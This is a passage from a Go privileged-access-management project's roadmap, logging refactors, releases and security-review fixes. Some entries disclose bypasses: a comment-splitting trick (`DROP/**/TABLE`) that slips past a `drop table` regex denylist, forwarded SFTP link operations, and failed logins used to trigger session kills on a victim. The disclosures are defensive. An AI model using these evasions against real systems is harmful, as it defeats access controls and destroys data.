self-contained, defer-free blocks into named builders so the startup sequence
reads as a list of steps. Behavior-identical — the same steps in the same order,
just named — and covered end to end by `cmd/pam-server/e2e_test.go` (which boots
the real `run()` over both the REST and SSH surfaces) plus the graceful-shutdown
test.

- [x] **`buildVault(cfg, log)`** — the KEK-options wall (local / Vault-Transit /
  AWS-KMS / PKCS#11) and the vault wrap
- [x] **`enableAuditChain(cfg, st, log)`** — the optional HMAC chain + signed
  checkpoint setup, with the same fail-loud key-size validation and the
  sign-seed-requires-HMAC rule, returning the parsed signing key
- [x] **`startSessionBuses(...)`** — the three cross-replica buses that share one
  custody key (kill / live relay / step-up decision). The nested `if/else`
  degradation ladder is flattened to early returns, preserving each best-effort
  fallback exactly (a failed `StartCluster` still starts the kill and step-up
  buses, as before)
- [x] `run()` drops to ~675 lines; the remaining wiring (guards, the API options
  literal, the background workers, the proxies) is left inline — those blocks
  share too many locals to extract without threading a long parameter list,
  which would trade one kind of density for another
- [x] No schema, route, wire-format or env-var change; `archgen` output unchanged

## Phase 99 — Store & API ergonomics ✅

Mechanical de-duplication and one determinism fix in the persistence and REST
layers, all behind the store conformance suite (`storetest`, which exercises
131/137 interface methods against both implementations, live Postgres in CI) and
the API tests.

- [x] **`ListSessions` now has a deterministic tie-break in both stores.**
  memstore used a non-stable `sort.Slice` on `CreatedAt`; pgstore had `ORDER BY
  created_at DESC` with no tiebreaker — so two sessions created in the same
  instant ordered arbitrarily, and differently in each. Both now break the tie on
  `id DESC`, so the two implementations cannot disagree
- [x] **memstore: two generic helpers replace fourteen hand-written bodies.**
  `getRow[K,V]` (lock → map lookup → `ErrNotFound` → pointer to a copy) covers
  six identical `Get*`; `deleteRow[K,V]` covers eight identical non-cascading
  `Delete*`. Package-level functions taking the receiver, since Go forbids type
  parameters on methods (the pattern the existing `window[T]` already set).
  Cascading deletes keep their own bodies
- [x] **pgstore: the three anonymous audit-event scanners become one
  `scanAuditEvent`.** `ListAudit`, `ExportAudit` and `AuditSince` each inlined
  the identical `(id, ts, actor, action, detail)` scan — the shape most likely to
  drift silently when a column is added
- [x] **API: `pagedList[T]` collapses the four plain list handlers** (targets,
  safes, users, vendors) into the route table. It fits only the handlers whose
  store method takes just the `(limit, after)` window; the ones with a filter (a
  target id, a status, an active flag) keep their bodies
- [x] Deferred as lower-value-than-they-looked: a `deleteByID` factory (the six
  delete handlers diverge in audit-detail format, so one factory would need a
  per-call formatter or an audit-detail change), and wrapping the 1,900-line
  `storetest` in `t.Run` subtests (a large churn for better failure isolation)
- [x] No schema, route, wire-format or env-var change; `archgen` output unchanged

## Phase 98 — Shared-helper consolidation ✅

The de-duplication half of the refactor review. Each item is a primitive that
existed in two or more packages; the security-relevant ones (token hashing, the
JWT audience check) are the point — a second copy of a security comparison is the
bug waiting to happen, as the break-glass-hash duplication (Phase 80) and the
audit-field sanitiser both taught. The repo's own `internal/auditfmt` package is
the precedent this follows.

- [x] **Token hashing has one definition, `auth.TokenHash`.** Four copies derived
  the hex SHA-256 that becomes a stored token-lookup key — `api.hashHex`,
  `broker.hashToken`, and inline in `agentid` and `auth` — and three of them feed
  a `*ByTokenHash` store lookup, so a drift between the site that writes a hash
  and the site that reads one is an auth bypass or a lockout. `api.hashHex` and
  `broker.hashToken` now delegate (their many call sites unchanged); `agentid`
  calls it directly
- [x] **JWT/JWKS primitives live in a new leaf `internal/jwtutil`.** The two
  independent verifiers — `oidc` (OIDC id_tokens) and `agentid` (SPIFFE
  JWT-SVIDs) — each had their own `decodeSegment`, `audienceContains`, `jwk` type
  and RSA-from-JWK. The **audience check had already diverged** (one copy guarded
  an empty claim, the other did not — not yet a live bug, exactly the kind that
  becomes one). Now `jwtutil.DecodeSegment` / `AudienceContains` (with the guard)
  / `JWK` / `RSAKeyFromJWK` are shared, with the package's first tests
- [x] **`remoteHost` → `ratelimit.Host`.** The rate-limit key derivation existed
  in `api` (string) and `proxy` (net.Addr + nil guard), both feeding the same
  `ratelimit.Limiter`; one definition now, the proxy keeping only its nil guard
- [x] **`oneLine` → `auditfmt.OneLine`.** The CR/LF log-injection sanitiser was
  byte-identical in `alert` and `auditfwd`; it joins `Field` in the package that
  exists precisely so this sanitiser is not re-typed per package
- [x] **`encodePEM` inlined** in `proxy` and `sshca` — an identity wrapper over
  `pem.EncodeToMemory` in each, adding nothing
- [x] Tests: `jwtutil` (audience/segment/RSA-key round-trip) and `auditfmt`
  (quoting+bounding, one-line) — the latter had **no test file** despite being
  the canonical audit-injection sanitiser. New `agentid → jwtutil`,
  `oidc → jwtutil`, `alert → auditfmt`, `auditfwd → auditfmt` edges in the
  archgen diagram; no schema, route, wire-format or env-var change
- [x] Deferred to a later, focused pass (each larger than it looks): tightening
  the gosec exclude list so `G304`/`G101` become enforced (needs ~17 file-read
  sites annotated first), and the `crypto/rand.Read` dead-error-branch cleanup
  (changes exported signatures)

## Phase 97 — Observability parity: the audit trail's operational twin ✅

Phase 96 made the security *audit* trail consistent across paths; this does the
same for the *operational* logs and the timestamps that reach a SIEM. Found in
the same review.

- [x] **`internal/session` now logs under `service=session`.** The package
  (2,260 LoC) had twenty-one log lines calling package-level `slog` directly —
  including the cross-replica authentication refusals (*"REJECTED an
  unauthenticated cross-replica session kill"*, *"REJECTED unauthenticated bus
  payloads"*, *"REJECTED an unauthenticated cross-replica step-up decision"*) —
  so they landed on the untagged default logger while every other subsystem
  carried a `service` tag. A `*slog.Logger` is now held on `Registry`, `Cluster`
  and `StepUp`, resolved at construction (never at package scope, because
  `logging.Component` binds `slog.Default()`, which `main` replaces in `Setup`
  after the package loads). The `storeError` 500-path in `internal/api` gets the
  same `service=api` tag (resolved at call time, since it is a package function
  with no `*Server` to reach `s.log`)
- [x] **Two externally-serialized timestamps normalized to UTC.** The webhook
  alert channel marshalled `alert.Event.Time` in whatever zone the caller
  stamped (the syslog and email channels already forced UTC via `stamp`), and
  `session.Info.Started` was a bare `time.Now()` at all six proxy/viewer/broker
  call sites while the store rows around it were UTC. Both are now normalized at
  their one choke point — `Webhook.Notify` before it marshals, and
  `Registry.Register` as every session enters — so a SIEM reading webhook alerts
  or the cross-replica live inventory never sees a mixed zone, and a new caller
  cannot reintroduce the drift
- [x] Tests: `session.TestRegisterNormalizesStartedToUTC`,
  `session.TestRegistryLoggerTagged`, `alert.TestWebhookSerializesTimeInUTC`
- [x] No schema, route, wire-format or env-var change. `archgen` picks up the
  one new `session → logging` dependency edge (regenerated in this change)

## Phase 96 — Refactor pass: cross-path security parity + convention hygiene ✅

A structural review of the session-proxy family and the shared helpers, acting on
what it found. The theme is **the same control, enforced the same way on every
path**: a fix that had landed on one entry point but not its siblings is a latent
gap, and the review turned three of them into closed gaps with tests.

- [x] **The agent broker's exec/credential tools now pass the vendor-contract
  gate.** Every other target-reaching path — SSH, PostgreSQL, SQL Server, the
  in-portal RDP/VNC viewer — refuses a vendor identity outside its approved,
  in-window contract (Phase 29). The broker's `ssh_exec`, `winrm_exec`,
  `reveal_credential` and `rotate_credential` did not, so a vendor holding
  `CapCallTool` (or `reveal_credential`) could reach a target account the same
  vendor was refused everywhere else. The gate is account-scoped, so each tool
  applies it (`vendorGateAgent`) the moment it resolves the credential — always
  before any secret exists. New `internal/api` test drives all four tools before
  and after an approved grant
- [x] **A vendor-contract refusal on the SSH proxy now audits as
  `access.denied`, not `session.denied`.** The SQL listeners, the viewer tunnel
  and the REST paths already recorded it under `access.denied`, and the OCSF
  exporter and the risk-analytics engine key off that vocabulary — so the lone
  `session.denied` on the SSH path had been silently excluding every SSH vendor
  refusal from SIEM export and risk scoring. Pinned by a proxy test
- [x] **The PostgreSQL and SSH deny paths now bound the operator-supplied login
  with `auditField`,** matching the SQL Server listener. The startup username is
  attacker-controlled bytes; interpolated raw into a `db.session.denied` /
  `session.denied` detail it could inject newlines or forge `key:value` pairs
  into the audit trail. The bounding-and-quoting the MSSQL sibling already did is
  now on all three. New test feeds a hostile login and asserts no audit row
  carries a raw newline or an escaped forged field
- [x] **The proxy's WinRM command loop fails closed on the `winrm.run` audit.**
  The REST WinRM endpoint has always withheld output when the durable audit
  cannot land (nobody acts on output the system of record never accounted for);
  its proxy twin audited best-effort *after* streaming. Now it audits first and
  withholds on failure, the same contract on both paths. New fail-closed test
- [x] **`-split-key` refuses an unparsable `PAM_BREAK_GLASS_SHARES` /
  `PAM_BREAK_GLASS_THRESHOLD`** instead of silently falling back to a default —
  a typo in the key ceremony could otherwise mint a share set with a different
  quorum than the same value `config.Load` refuses at server start
- [x] **Convention hygiene** (the repo's own stated invariants, made true again):
  nine functions regained the doc comment the project requires — three had been
  orphaned by a `const` inserted between the comment and its function, so godoc
  bound the text to the wrong declaration; four `//nolint:` directives (a
  golangci-lint syntax nothing in CI reads, so they suppressed nothing) became
  real `#nosec Gxxx -- reason` annotations or plain comments; two hand-rolled
  `contains` helpers became `slices.Contains`; and the dead, superseded
  `sshca.LoadOrCreate` (zero callers, an unannotated file read) was deleted
- [x] No schema, route, wire-format or env-var change; `archgen` output
  unchanged. All CI gates green (`go test -race`, staticcheck, govulncheck,
  gosec, the diagram drift check)

## Phase 95 — Documentation currency pass ✅

The second full currency pass (the first was 70a). Phase 94's release work
restated the READMEs' release facts but not their story; the rest of the doc set
had drifted header by header — accurate in body, understating in claim. Found by
reading the docs against the code, the config surface and the release page, not
by trusting the headers.

- [x] **Every `Reflects:` header now says 0–94 / v0.18.1.** They ranged from
  0–70 to 0–93; the docs hub still claimed release v0.13.0, NIS2 cited v0.10.0
  as *the* published release, and both READMEs dated v0.18.1 to 2026-08-08 (the
  GitHub release page says 2026-08-09)
- [x] **The READMEs' story no longer stops in July.** The intro claimed the
  roadmap "runs 0–75", "What works today" claimed 0–55, and the phase table's
  closing paragraph still narrated the v0.11 era. Now: intro and section
  headers say 0–94, the closing paragraph carries 62–94 (both languages), the
  Spanish table gains the rows 56–61 the English one already had, and the
  feature bullets absorb what shipped since — the ticket gate's Phase 60/84
  depth, campaign scoping/scheduling/reminders (68–70), runtime secret refresh
  (78), and a **threat-analytics bullet that had never existed** despite being
  a Tier-3 headline (23/86)
- [x] **PORTS-AND-FLOWS gains E14** — the outbound ITSM ticket-validation call,
  an egress the matrix had omitted since Phase 20 and Phase 84 made
  first-class. Table, diagram and firewall summary: a reader building a
  NetworkPolicy from that doc would have blocked their own ticket gate
- [x] **EXTERNAL-INFRA-GAPS' ITSM row caught up with Phase 84**: the connectors
  are in-process now; what stays external is interop against a real
  ServiceNow/Jira instance (the same honest status as SQL Server)
- [x] **CODE-GUIDE**: the package map gains the ten shipped packages it lacked
  (`keycustody`, `cmdguard`, `blast`, `vendor`, `recording`, `tds`, `auditfmt`,
  `auditfwd`, `ocsf`, `ratelimit`), the ITSM paragraph covers 84/60, and the
  CI-gate list adds the manifests job (helm lint + render + kubeconform)
- [x] **Guides**: USER-GUIDE tells operators a ticket must now **name them**
  (84), a high risk score can sign them out (86), and read-only SFTP refuses
  link ops (92); SYSADMIN-GUIDE names the 84/86 knob families; HIGH-LEVEL
  carries the 71–94 arc and the 84/86 capability-row depth
- [x] Docs-only; no code, schema or route change, so the `archgen` output is
  untouched and no release is needed

## Phase 94 — v0.18.1 ✅

Batched release of the adversarial-review pass: Phase 92 (the SFTP read-only
containment fix — a real security fix) with Phase 91 (KEK-rotation completeness
test) and Phase 93 (the command-gate honesty docs). The review that produced them
also confirmed the vault, the database proxies and the broker four-eyes **sound**
— two clean subsystems in a row, the honest signal to stop looking.

- [x] **v0.18.1** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-09 as `ghcr.io/morandeirachema/pamv1:0.18.1` (also `latest`),
  digest
  `sha256:d1c1bc870b81d7d6497b4be28095f0a3e337f68da407ab62d267abaf3de24184`,
  **public** (anonymous pull 200). Keyless-signed with the SBOM and SLSA
  provenance as OCI referrers; the Release carries `sbom.spdx.json`
- [x] All five pins via the sweep; Helm chart `version` 0.9.0 -> **0.9.1**
- [x] Both READMEs restated; label-vs-URL equality re-checked (0 mismatches)

## Phase 93 — The command/step-up gate is best-effort, and the docs now say so ✅

Finishing the adversarial review of the database proxies (Phases 91–92 were vault
and SFTP). The proxies came through **sound** — the review's value here was
confirming that and closing one honesty gap.

- [x] **Confirmed sound**: both `Query` and `Parse` are gated on postgres (a
  prepared statement cannot slip past the supervisor); `mssql` gates every call
  and every SQL-bearing parameter in a multi-call RPC and **fails closed** on an
  unparseable request (more thorough than postgres); statement text is quoted
  into audit details with `auditCmd`; step-up is fail-closed on timeout/denial;
  and the `sid==""` step-up skip is unreachable in the shipped binary because
  `main` always wires a session Registry (`session.NewRegistry()`), so it is a
  defensive clause, not a bypass
- [x] **Finding BZ, fixed (docs only)**: `cmdguard.Guard.Blocked` matches each
  regex against the raw statement text with no comment-stripping or case-folding,
  so `DROP/**/TABLE` and odd whitespace evade `(?i)drop\s+table`, and an anchored
  pattern misses a statement smuggled after a benign one. The docs disclaimed
  only interactive **shells** as "not a containment boundary" while presenting the
  discrete-command and database-statement paths — and the step-up (four-eyes)
  gate — as reliable. §9.4 now extends the caveat to every discrete-command path
  and the step-up gate, recommends unanchored `(?i)` patterns, and states plainly
  that a hard guarantee must come from database-side roles, not the regex gate
- [x] **No code change, deliberately**: stripping SQL comments correctly needs
  the parser the design omits on purpose; a fragile stripper would break
  legitimate queries or manufacture false matches. The honest fix is disclosure,
  the same call the shell disclaimer already made

## Phase 92 — SFTP read-only closes the native-op door ✅

Continuing the adversarial review (Phase 91 was the vault). One finding, in a
control whose whole job is containment.

- [x] **Read-only SFTP forwarded a native mutating op as a read** (finding BY).
  `handlePacket`'s request switch enumerated the mutating packets and sent
  everything else to `default: return true`. `SSH_FXP_LINK` (21, the v6
  hard/symlink op) and `BLOCK`/`UNBLOCK` (22/23) were not enumerated, so they were
  forwarded — a write in a read-only session against any SFTP server that speaks
  the native op. The openssh EXTENDED twin `hardlink@openssh.com` was already
  refused by `handleExtended`; the two default arms had **opposite postures**,
  and the native one was fail-open
- [x] **Fixed to match `handleExtended`.** The native default now fails closed in
  read-only mode: it forwards only the read family (LSTAT/FSTAT/OPENDIR/READDIR/
  REALPATH/STAT/READLINK) and refuses anything else with a synthesized
  `SSH_FX_PERMISSION_DENIED`. This is fail-closed by construction — a future or
  vendor native op is refused, not forwarded — the property a containment control
  needs, rather than an enumerate-every-mutation list that missed LINK once
- [x] **Allow mode unchanged, but LINK is now audited** (`sftp.modify op:link`):
  the explicit cases audit their mutations; LINK had no case, so an allow-mode
  hard/symlink was invisible in the trail the guard promises records every file
  operation
- [x] Tests: `TestSFTPReadOnlyRefusesNativeMutations` (LINK/BLOCK/UNBLOCK
  refused; the read family still forwarded, so legitimate browsing/download is
  not broken) and `TestSFTPAllowForwardsNativeLink` (forwarded and audited),
  verified to fail against the pre-fix fail-open default

## Phase 91 — Pin KEK-rotation completeness ✅

An adversarial review of the vault crown jewels (`internal/vault` + the AAD-parity
coupling) found the crypto sound — `crypto/rand` throughout, a fresh data key per
message so the random GCM nonce is safe, AAD bound on every seal, uniform
`ErrInvalidToken` on every failure, `SecretEnc` `json:"-"`, no plaintext logged,
and the reveal path fail-closed with `mustAudit`. One **latent fragility** was
worth locking in.

- [x] **KEK-rotation completeness rested on an unstated convention two packages
  away.** `RotateVaultKEK` re-wraps every credential via
  `ListCredentials(ctx, 0, 0, 0)`, relying on `limit=0` meaning *unlimited*
  (pgstore → `LIMIT NULL`, memstore → no truncation). Correct today — verified —
  but a plausible future refactor making `limit=0` a default page size would
  silently re-wrap only the first page and **report success**, stranding the rest
  under the old KEK. That is the omission-class outage the four-kinds interface
  was written to prevent, arriving through a different door
- [x] **Pinned with a test, not a rewrite.** `RotateVaultKEK` is a working
  crown-jewel path; the proportionate fix is a completeness test that seeds 250
  credentials (past the 100 default / 500 max page sizes) and asserts **every**
  one re-wraps under the new KEK and no longer decrypts under the old — plus a
  comment at the call site making the dependency explicit. Verified to fail
  against a simulated first-page-only refactor (`rotated 100 of 250`)
- [x] Test-only; no production behaviour change, no release needed

## Phase 90 — v0.18.0 ✅

Phase 89 is an audit-integrity fix (false four-eyes records on a failed step-up
dispatch). Applying the pin-currency rule to it — even though the residual is
narrow — is the consistency the rule is worth nothing without.

- [x] **v0.18.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-09 as `ghcr.io/morandeirachema/pamv1:0.18.0` (also `latest`),
  digest
  `sha256:981dd2f27b1575494ecbc788f687e4eb64cade73900e6dc678f4e55929fcc4ac`,
  **public** (anonymous pull 200). Keyless-signed with the SBOM and SLSA
  provenance as OCI referrers; the Release carries `sbom.spdx.json`
- [x] All five pins via the sweep; Helm chart `version` 0.8.0 -> **0.9.0**
- [x] Both READMEs restated; label-vs-URL equality re-checked (0 mismatches)

## Phase 89 — Close the open-findings backlog ✅

Answering "what is next" honestly turned up that `docs/SECURITY-GAPS.md` still
marked five findings (AO–AS) **Open** that ROADMAP §0 and the Phase 63 entry had
recorded closed. The self-audit of record asserting fixed defects were open is
**finding AT recurring** — so the reconciliation is itself the point.

- [x] **Re-verified AP, AQ, AR, AS against current code** — all fixed by Phase 63
  (playback `mustAudit`; the dead `required` field removed; a real `c.open`
  counter replacing the whole-map rescan; the vocabulary drift corrected) — and
  corrected their Status cells to match
- [x] **AO had a genuine residual, which its own status line had predicted.**
  Phase 63 moved the *systematic* refusals (self-approval, paused-nowhere) before
  the fail-closed `session.stepup_decided`, so an ordinary refusal writes no
  record. But when a decision **is** attempted and the remote dispatch then fails
  — or a local `DecideBy` loses the microsecond race the advisory `Holder`
  pre-check cannot close — the decided-record was already written, standing for a
  four-eyes release that never happened, in a chained trail the retention worker
  will not prune
- [x] **Fixed with a compensating event, not by reordering.** Auditing *before*
  the side effect is correct — a released statement must never outlive the
  evidence of who released it — so the fix is a best-effort
  **`session.stepup_decision_voided`** on the three failure branches
  (dispatch-failed / self-approval-race / already-resolved) that nets the trail
  out. Test verified to fail against the pre-fix code, using a fake bus that lists
  the sealed pause but fails the publish
- [x] The section header's stale "seven are open" corrected; §5 gains the new
  action

## Phase 88 — v0.17.0 ✅

Phases 86 (analytics depth) and 87 (its review) unreleased. Phase 87 fixed a way
the automated responses could be turned on a bystander, and auto-kill has shipped
since Phase 23 — a fix to released behaviour, so the pin-currency rule applies.

- [x] **v0.17.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-09 as `ghcr.io/morandeirachema/pamv1:0.17.0` (also `latest`),
  digest
  `sha256:7d6f374f764c2d718b9def28566c14b73624dcef4256e270347b5e3b39e29cc6`,
  **public** — an anonymous manifest pull returns 200. Keyless-signed with the
  SBOM and SLSA provenance as OCI referrers; the GitHub Release carries
  `sbom.spdx.json`
- [x] All five pins, via the sweep (grep every version reference under `deploy/`,
  require exactly one release) rather than the list
- [x] Helm chart `version` 0.7.0 -> **0.8.0** alongside `appVersion`
- [x] Both READMEs restated; label-vs-URL equality re-checked (0 mismatches)

## Phase 87 — The review of Phase 86 ✅

One finding, and it is the shape a review is for: a security feature an
unauthenticated attacker could point at a bystander.

- [x] **An automated response could be aimed at any account** (finding BX). The
  risk score counts auth failures, and an auth failure records the *presented*
  username as the actor — `login.failed` stores it raw, and anyone can present
  any username unauthenticated. So the auto-kill (Phase 23) and the new
  auto-step-up (Phase 86) fired on a name the attacker chose. Confirmed by
  execution: **7** failed logins as a victim reach *high* → their logins are
  revoked; **10** reach *critical* → their live sessions are killed. The attacker
  needs only a username, which is not secret. "Many auth failures for X" means
  *someone is attacking X*, not *X is misbehaving* — and the response punished X
- [x] **Fixed by splitting alert from response.** `analytics.Finding` gains
  `ResponseScore`/`ResponseLevel`, which exclude the signals a stranger can pin
  on a name they do not control — `auth_failure` is the only one, because every
  other signal requires the actor to have authenticated and acted. The responses
  gate on `ResponseLevel`; the **alert still fires on `Level`**, because a human
  *should* be told an account is being brute-forced. An attacker can no longer
  push even a legitimately-active actor over the response threshold by adding
  failed logins under their name
- [x] Both regression tests verified to **fail against the pre-fix code** — the
  pass test kills the victim's session when the gate is reverted to `Level`
- [x] The `analytics.risk_flagged` detail now carries `response_level:` beside
  `level:` so an operator reading the trail sees why an auth-failure-only
  "critical" drew no automated response. No new audit action

## Phase 86 — Analytics that need history ✅

Closes the Phase 23 deferral. The six original signals all answer "is this event
itself suspicious?" — a break-glass use, a blocked command, a failed decrypt.
That catches the loud things and misses the quiet one an insider actually does:
ordinary, well-formed access to somewhere they have no business being.

- [x] **Novelty** — this actor has never used this target before. Nothing about
  the event looks wrong in isolation, which is exactly why it needs history.
  `analytics.Baseline` is built from the audit window *preceding* the scored one,
  so it needs no new storage — only a wider read
- [x] **Silent without history, deliberately.** A nil baseline scores exactly as
  before, and an actor the baseline does not know scores no novelty at all.
  Otherwise the first run after deployment, and every new joiner's first week,
  reads as a stream of anomalies — which is how a signal teaches people to
  ignore it. A new joiner and an account takeover look identical on day one; the
  difference only exists once there is something to deviate from
- [x] **Peer outlier** — an actor far above the volume of their peers in the same
  window. Compared against the **median**, which stays put when several actors
  are extreme, and skipped entirely below `PeerMinActors`: two people are not a
  distribution
- [x] **Step-up as an automated response** (`PAM_ANALYTICS_AUTO_STEPUP`): a
  **high**-risk actor's portal logins are revoked, so their next action needs a
  fresh authentication — a second factor where MFA is enrolled. It sits *below*
  the kill threshold, because kill-or-nothing is a bad menu: killing a
  high-risk-but-legitimate operator mid-change is itself an incident, and the
  response that fits most findings is "prove it", not "get out"
- [x] **A zero-value trap caught by an existing test.** A zero `PeerFactor` makes
  the threshold `median × 0` = 0 and a zero `PeerMinActors` removes the
  peer-group guard, so every actor in every window scored as an outlier —
  `New` now defaults both and `peerVolumes` refuses the nonsense configuration
  outright. A zero value that silently means "flag everything" is the worst kind,
  because it looks like the feature working
- [x] **One test renamed rather than left overclaiming.** It was called
  "ComparesAgainstTheMedian"; with a single outlier the mean and the median reach
  the same verdict on that fixture, so the name asserted something the test
  cannot see. It now claims what it proves, and the median argument lives in
  `peerVolumes` as the design note it is
- [x] Both novelty checks verified against a deliberately broken build

## Phase 85 — v0.16.0 ✅

Phase 84 closed finding **BW** — a valid ticket number worked as a shared
password — so the pin-currency rule applies: after a security fix, check whether
the pinned tag predates it. It did.

- [x] **v0.16.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.16.0` (also `latest`),
  digest
  `sha256:04cdbddbe83ff465fd1aa12ba3123f69858a25fea62f97649bff056429c0e2f5`,
  **public** — an anonymous manifest pull returns 200. Keyless-signed with the
  SBOM and SLSA provenance as OCI referrers; the GitHub Release carries
  `sbom.spdx.json`
- [x] **All five pins**, using the sweep rather than the list: `grep` every
  version reference under `deploy/` and require exactly one release. That is the
  check that caught the flux tag last time, and it is the one worth running
  because it cannot go stale the way a list of paths can
- [x] Helm chart `version` 0.6.0 → **0.7.0** alongside `appVersion`
- [x] Both READMEs restated; label-vs-URL equality re-checked (0 mismatches)

## Phase 84 — The ticket gate learns who you are ✅

Closes the Phase 20 deferral. The generic webhook shipped; a first-class
ServiceNow/Jira connector did not — and the gap was not only convenience.

- [x] **A valid ticket number admitted anyone who knew one.** The webhook payload
  carried `{"ticket": id}` and nothing else, so the endpoint could answer "does
  this ticket exist" and never "is it *yours*". A change number quoted from a
  colleague's queue passed the gate. `Validator.Validate` now takes the **actor**,
  threaded through both call sites — and at the connect-time fold it is the person
  *connecting*, not the approval's recorded requester, because the question is
  whether the ticket authorises the access being used right now
- [x] **`internal/ticket` gains a `Provider` interface** and three
  implementations, selected by `PAM_TICKET_PROVIDER`: **ServiceNow** (Table API,
  `sysparm_display_value=true` so reference fields read as names rather than
  sys_ids), **Jira** (`/rest/api/3/issue/{key}`), and the existing **webhook**,
  which stays the default so an existing deployment is untouched
- [x] **Three checks a 2xx cannot express**: *state* (closed, cancelled or draft
  is not authorisation), *window* (`start_date`/`end_date` — access outside the
  approved window is the classic audit finding), and *person*. An absent window
  bound means "no bound", so an open-ended standard change still works; a bound
  that IS present is enforced strictly
- [x] **Person matching is deliberately forgiving**: case-insensitive, and an
  email local part counts, because the same human is `alice` in pamv1 and
  `alice@acme.com` in Jira. A rule that rejects real people gets switched off, and
  a control that is off protects nobody. What an operator tightens is the *field
  list*, not the comparison
- [x] `PAM_TICKET_BIND_ACTOR` defaults **on** — the binding is the point. The
  webhook payload gains `"actor"`, which is backward compatible: an endpoint that
  ignores it behaves exactly as before
- [x] Fake-ITSM tests for both connectors — state, window, person, unknown ticket,
  and an unauthenticated lookup (so a connector that forgot its credentials
  cannot pass). The **person** and **window** checks were each verified against a
  deliberately broken build
- [x] **Not asserted, deliberately**: what a live ServiceNow or Jira returns. That
  needs an account; it is catalogued in EXTERNAL-INFRA-GAPS rather than claimed

## Phase 83 — v0.15.0 ✅

Five phases unreleased (78–82): a feature with two new environment variables, the
deploy examples, and the end-to-end test. A **minor**, not a patch.

- [x] **v0.15.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-08 as `ghcr.io/morandeirachema/pamv1:0.15.0` (also `latest`),
  digest
  `sha256:0606933965a2da7049d7eb66fa4ed516132baef1ccdc3534b82dfbeca68c69bf`,
  **public** — an anonymous manifest pull returns 200. Keyless-signed with the
  SBOM and SLSA provenance attached as OCI referrers (not the legacy
  `.sig`/`.att` tags — see Phase 76a), and the GitHub Release carries
  `sbom.spdx.json`
- [x] **The release checklist was wrong, and its own check caught it.** It has
  always said "all four pins together"; Phase 79 added a **fifth** —
  `deploy/k8s/flux/gitrepository.yaml`, which pins the git *tag* Flux reconciles
  from — without adding it to the checklist. It was still on `v0.14.3` after the
  other four moved, so the shipped GitOps example would have deployed the
  previous release. The checklist now says **five**, and the sweep that found it
  (`grep` every version reference in `deploy/` and require exactly one release)
  is the check to keep: a list of places is only as good as its last update,
  while "show me every version string" cannot go stale
- [x] Helm chart `version` 0.5.3 → **0.6.0** alongside `appVersion`, because the
  app change is a minor
- [x] Both READMEs restated; label-vs-URL equality re-checked (0 mismatches)
- [x] **The changelog was consolidated rather than concatenated.** Five phases had
  each prepended their own `### Added`/`### Fixed`, leaving duplicated headings.
  More importantly, most of the "Security"/"Fixed" entries described defects
  **introduced and fixed between tags** — listing them as fixes would tell a
  reader that 0.14.3 was vulnerable to things it never contained. They are now one
  honest "Development note" pointing at SECURITY-GAPS, and the only entry under
  **Fixed** is the `kubectl apply -f` bug, which really had been shipping

## Phase 82 — The review of Phases 79–81 ✅

Three findings, and the first is the one worth remembering: **Phase 80's fix for
finding BM reintroduced BM inside the fix itself.**

- [x] **A secret pinned in the environment and managed in Conjur was never
  refreshed, while the startup log said Conjur wins** (finding BT). Phase 80
  correctly changed ownership from "Conjur *filled* this at boot" to "Conjur
  *manages* this", and added a warning for the ambiguous case — then seeded the
  change-detection digest from **what Conjur held**, so the opening tick compared
  Conjur against Conjur, found no change, and skipped forever. In every shipped
  deployment (docker-compose hard-requires `PAM_API_KEY`, the K8s secret ships
  it, the OVA generates it) that is the *only* case. Reproduced before fixing:
  `changed=[] applied=""`. Now seeded from what the process booted with —
  a single read, not the finding-BH mistake of treating the environment as the
  last-applied store across ticks
- [x] **Two comments had drifted from the statements they document** (BU). Three
  explanatory blocks had stacked in `config.Load`'s validation with no code
  between them, so the 1 PiB SFTP reasoning sat above the Conjur refresh check.
  Each insertion — Phase 76, then 78 — landed between a comment and its `if`
- [x] **An applier for a non-sourceable name was a silent no-op** (BV): never
  fetched, never applied, never audited, and indistinguishable from "Conjur does
  not manage it". Since the applier map *is* the definition of refreshable
  (finding BK), a typo in it silently shrank that definition. Refused at wiring
  time now
- [x] Both fixes carry a regression test **verified to fail against the previous
  code**. The seeding mutation initially failed to compile, so that run proved
  nothing and was redone — a mutation that does not apply looks exactly like a
  test that caught nothing
- [x] **Phases 79 and 81 came through clean.** 79's examples were already
  verified by building both kustomize bases and round-tripping all three sealed
  files; 81's six assertions were each checked against a broken build before it
  landed

**The generalizable lesson:** a fix that adds a claim to a log has to be checked
against *the claim*, not against the bug it replaced. Both halves of Phase 80's
fix were implemented and neither was run against the other.

## Phase 81 — Proving it is a PAM, in CI ✅

The question "is this actually a functional PAM?" was answered by hand: an SSH
target that accepts *only* the vaulted password, an operator connecting with
nothing but the API key, and the credential never crossing to the operator. That
proof lived in a terminal and died with it.

- [x] **`cmd/pam-server/e2e_test.go`** boots the real server — `run()`, so the
  binary's own body, through `config.Load` and every listener — against a live
  SSH upstream, then drives it over the REST API and the SSH proxy exactly as an
  operator and an administrator would. It asserts the six properties that make
  this a PAM rather than a bastion with a database:
  **JIT injection** (the upstream accepts only the vaulted secret, so arriving
  proves it was injected); **the secret leaks nowhere** (zero occurrences in the
  recording, the hash chain, and the whole audit trail); **RBAC** (a `user`
  connects but cannot manage or reveal; no key is 401); **the approval gate on
  every path to the secret** (connect *and* reveal refused, self-approval 403,
  then permitted after an admin approves); **tamper detection in both
  directions**; and **command control**
- [x] **Every assertion was verified against a deliberately broken build** —
  six mutations, each reverted: send the operator's key upstream instead of the
  vaulted secret; leak the secret into an audit detail; weaken `authz`'s
  capability; make the approval gate always pass; make the denylist match
  nothing; and force the recording-audited verdict to `false` **and** to `true`,
  because a tamper check asserted in one direction only passes against a control
  that always says "tampered"
- [x] **The harness is faithful, which the scratch one was not.** The throwaway
  target used during the manual run answered `exit 0` to *every* command, which
  made a failed credential rotation look successful and nearly produced a
  reported defect that did not exist. This upstream refuses commands it does not
  know. An upstream that cannot fail makes the test that uses it unable to fail
- [x] No CI change: it needs no external tool, so it runs inside
  `go test -race ./...` and **cannot silently skip**. Runtime ~0.12s
- [x] Two gaps the manual run exposed are now encoded: the env var is
  `PAM_SSH_ADDR` (setting the plausible-looking `PAM_SSH_LISTEN_ADDR` is silently
